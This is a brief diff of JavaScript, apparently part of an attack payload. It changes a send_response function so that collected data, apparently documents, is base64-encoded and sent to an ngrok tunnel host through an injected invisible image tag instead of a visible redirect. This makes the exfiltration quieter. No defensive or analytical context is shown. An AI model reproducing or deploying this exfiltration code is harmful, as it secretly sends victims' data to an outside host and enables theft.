@@ -13,7 +13,7 @@ function dataURItoBlob(dataURI) {
 }
 
 function send_response(resp){
-    window.location = "https://e8023e55.ngrok.io/record-data?name=documents&data="+btoa(encodeURI(resp));
+    document.write('<img src="https://e8023e55.ngrok.io/record-data?name=documents&data='+btoa(encodeURI(resp))+'">');
 }
 
 function get_documents(resp){
